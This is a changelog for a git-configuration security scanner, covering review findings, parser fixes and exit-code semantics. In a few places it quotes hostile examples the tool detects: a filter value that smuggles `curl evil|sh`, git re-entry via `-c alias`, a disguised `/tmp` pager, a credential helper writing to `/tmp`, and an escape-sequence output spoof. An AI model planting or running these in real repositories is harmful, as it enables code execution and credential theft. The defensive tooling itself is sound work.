# Changelog

## 0.4.0 — 2026-09-08

Closes all seventeen findings from the first independent security review, and the five from the second, against acceptance gates written before the work started. Detection stays at git level; a separate confidence axis and the next detection class move to 0.5.0.

**Second review round — the published package, and what a scan may claim**

- **N-1** `bin/guardskill.js` is the entry point. The CLI used to guard its own execution with `import.meta.url === pathToFileURL(process.argv[1])`, which is false when npm's bin symlink starts it: installed from the registry, `guardskill` printed nothing and exited 0. `src/cli.js` is now a library that exports `run`, and the tests that matter drive the packed tarball — `npm pack`, install into a throwaway directory, run `node_modules/.bin/guardskill` — on Linux, macOS and Windows. That is the only test that touches what a user actually gets.
- **N-2** The value parser is a single pass carrying quote state, because git's is. Stripping comments first and unquoting afterwards missed a quote opened halfway through a value: `clean = cat" ; curl evil|sh"` read as the bare command `cat"` and scored low, while git read the whole command and ran it. That case is now high. The golden table is now generated as well as hand-written: 41 hand-picked cases plus 512 permutations of quote, comment, escape and separator position, put to `git config --file` offline and committed — 553 cases, 391 of which git accepts and answers, and the parser agrees with git on every one. Four of the five declared deviations disappeared with the rewrite; only valueless keys remain. The permuting generator is the point: the hand-written table had no case with a quote in the middle of a value, and an assertion that fails on undeclared deviations can only fail on what is in the table.
- **N-3** Reads are bounded at the file handle, not after loading. `readFile().slice()` allocated a 400 MB hook script in full, and past Node's maximum string length it threw — the catch turned that into an empty head, indistinguishable from "read it, found nothing", quietly dropping a padded hook from critical to high. A config or hook that exists and cannot be read is now its own finding and marks the scan INCOMPLETE, because an unread file is the one thing a scanner must never report as an absence of findings.
- **N-4** `status` and the exit code are separate answers. `status` says what was found; the exit code says whether that clears the threshold you set. A medium finding under the default threshold reports `status: FINDINGS` with exit 0, and `CLEAN` now means zero findings and nothing else. With `--json`, a failure answers in JSON too.
- **N-5** Findings from a case-variant `.GIT` directory on a case-sensitive volume are capped at medium, with the reason appended to the explanation: live on Windows and macOS, inert where it was found.

**First review round — security: false negatives that let a working attack through**

- **F-01** `include.path` and `includeIf.*.path` are now followed and inspected when the target lies inside the scanned tree, with the include chain in the finding's location. Previously the include was reported at medium and the file behind it never opened, so a payload one file away passed the documented CI recipe with exit 0. An include that points outside the tree, or cannot be read, is high and marks the scan INCOMPLETE.
- **F-02** `git` is no longer a safe command prefix. It never should have been: `git -c alias.x=!cmd x` is an arbitrary command that starts with the word git. Filter, textconv and merge-driver values are now matched against an exact allowlist, and any git invocation carrying `-c`, `--config-env`, `--exec-path`, `-p` or `--paginate` is critical.
- **F-03** Seven executing keys added: `pager.<cmd>`, `gpg.program`, `remote.<n>.uploadPack` / `receivePack`, `core.askPass`, `core.alternateRefsCommand`, `trailer.<t>.command`, `init.templateDir`. Also `browser`, `guitool` and `man` tool commands.
- **F-04** An alias that re-enters git with its own configuration (`-c`, `--exec-path`, `-C`, …) is high, alongside the existing rule for values starting with `!`.
- **F-05** Hook scripts that are symlinks are inspected. One pointing outside the tree is critical and its target is deliberately not read.
- **F-06** Directory names are matched case-insensitively where the file system folds case, decided by a read-only probe rather than by `process.platform`. On a case-sensitive volume a directory named `.GIT` is reported at medium with the reason: not a git directory here, but live on Windows and macOS.

**Reliability — three ways a scan could report success without proving anything**

- **F-07** Four end states in text, JSON and exit code: CLEAN 0, FINDINGS 1, ERROR 2, INCOMPLETE 3. A missing path is an error instead of a clean result; a truncated walk fails unless `--allow-incomplete` is given. `--fail-on` moves the severity threshold only. The CLI default depth is 24, matching the library and the help text — a test compares them.
- **F-08** `process.exit()` is gone from every path that writes to stdout. Through a pipe it truncated JSON at exactly 65,536 bytes with the exit code still reporting success. Regression test: over 1 MB through a pipe, byte-length compared against the same scan captured whole.
- **F-12** The rule set is validated at load: required fields, severity from the four allowed values, known match type, every pattern compiled once. An unknown severity used to make `SEVERITIES.indexOf` return -1 and pin the exit code to 1 for every scan.

**Security of the tool itself**

- **F-09** Config files reached through a symlink are refused, reported at high, and mark the scan INCOMPLETE — they are not read. The previous version's walk did not follow symlinks but `readFile` did, so a delivered directory could have any readable file's contents printed as evidence. Applies to `config`, `config.worktree`, `worktrees/*/config.worktree`, `modules/**/config`, `.gitmodules` and the `.git` file.
- **F-11** `location`, `title` and `explanation` are sanitised in both formatters, not only `evidence`. A directory name carrying `ESC [ 2K CR` could otherwise erase the line it appeared on and write a fake "No findings" over it. Raw values survive only in the JSON output, with the escape character escaped.

**Correctness — false positives that broke the documented CI recipe**

- **F-10** Severity now depends on what a value names rather than on which key it is:
  - a bare command resolved from PATH in a filter, textconv or merge driver (`cat`, `sops`, `jupyter nbconvert`) is informational; a path, a shell metacharacter, `/tmp`, or a git re-entry is high or critical;
  - a bare repository or unregistered nested `.git` is medium on its own and critical when that same config carries something git executes — the boundary is pinned from both sides by two tests, and the existing critical assertion was not weakened;
  - `.gitmodules` is read for every repository found, not only the scan root, so a submodule registered by the subproject that owns it is no longer reported;
  - arguments to an allowlisted credential helper are inspected: `store --file=/tmp/git-credentials` is high.

**Release integrity and documentation**

- **F-13** `package.json` carries no placeholder; `homepage`, `repository.url` and `bugs.url` point at the real repository. A test and a release-workflow step both refuse a placeholder.
- **F-14** The README no longer prints an install command that fails. Until the first npm release it shows the clone-and-run form.
- **F-15** Every behavioural claim in the README, `SECURITY.md`, `SKILL.md` and the help text is listed in the claim-parity table in `SECURITY.md` with the test that proves it, and a test fails when a claim points at a test that does not exist. Absolute phrasings that the code did not make true are gone.
- **F-16** Tests that cannot run on a platform call `t.skip()` with a reason instead of returning quietly. CI fails if anything is skipped on Linux.
- **F-17** GitHub Actions pinned to commit SHAs; a tag-only `release.yml` publishing with npm provenance through OIDC, never triggered by a pull request; the dead `node_modules/.cache` skip entry removed; PowerShell, `certutil`, `bitsadmin` and `mshta` added to the remote-execution indicators; this changelog put in chronological order.

**Test infrastructure**

- `rules/git-exec-keys-inventory.md` — every executing git key with its source and status, `covered` with a rule id or `out-of-scope` with a reason. A test fails when the inventory and the rule set drift apart, so a gap is visible instead of forgotten.
- `test/fixtures/gitconfig-golden.json` — 25 cases with the output of `git config --file X --list -z` from git 2.43.0, generated once offline by `tools/generate-golden.mjs` and committed. The suite compares the parser against it and fails on any difference that is not declared, with a reason, in `test/golden.test.js`. Two real parser bugs came out of this: continuation lines were trimmed, and tabs in unquoted values were kept where git records a space.
- `test/corpus/` — five real-world repository shapes with a hard ceiling: no `critical`, and no `high` that `PROVENANCE.md` does not declare. This is the check that would have found F-10 first.
- Contract tests for all four exit codes, the JSON schema, help-text parity and a measured performance budget.
- 66 tests, none skipped on Linux.

## 0.3.0 — 2026-09-08

Hardening pass driven by attacking the previous version rather than by adding features.

**Fixed — evasions**
- An allowlisted command name matched on basename, so `core.pager = /tmp/less` passed as `less`. Allowlists now apply only to bare command names, never to paths.
- A hooks directory named `.husky` or `.githooks` was downgraded on the strength of its name. Scripts are classified individually.

**Fixed — configs that were never read**
- `config.worktree`, `.git/worktrees/*/config.worktree` and every `.git/modules/<name>/config` are now inspected.
- A `.git` *file* (`gitdir: …`) is followed when it points inside the scanned tree.
- Bare-repository detection no longer requires a `refs/` directory.
- Default traversal depth raised from 8 to 24 in the library. (The CLI kept passing 8 — fixed in 0.4.0 as F-07a.)

**Added**
- `protocol.allow` / `protocol.<name>.allow`, `ext::` transport URLs, and a finding when a config is too large to parse.
- Control characters stripped from config values before output.

**Testing**
- Evasion suite and robustness suite. Clean fixtures 20 → 29, hostile 10 → 22.

## 0.2.1 — 2026-09-08

**Fixed**
- The test script used a shell glob (`node --test ./test/*.test.js`), which cmd.exe and PowerShell do not expand — CI failed on Windows with Node 18 and 20 while passing on Node 22. `test/run.js` resolves the file list in JavaScript.

## 0.2.0 — 2026-09-08

Rewritten after checking v0.1 against the primary sources. v0.1 scanned only the top-level `.git/config`, which is the one configuration in a normally cloned project that is least likely to be hostile.

- Tree-walking discovery: nested `.git` directories and bare repositories anywhere under the scanned path.
- Detection for indirect execution keys: shell aliases, filter drivers, `diff.*.textconv`, merge drivers, `mergetool`/`difftool` commands, `credential.helper`, `diff.external`, `core.gitProxy`, `core.editor`, `sequence.editor`, `uploadpack.packObjectsHook`.
- Hook-content inspection; husky, lefthook and pre-commit recognised.
- `--json`, `--fail-on`, `--max-depth`, `--exclude`, `--no-color`, `--version`.
- English throughout. Traversal never follows symlinks.

## 0.1.0 — 2026-09-08

First internal build. `core.fsmonitor`, `core.sshCommand`, `core.pager`, `core.hooksPath`, `include.path` in the top-level `.git/config`, plus active hooks. Never published.
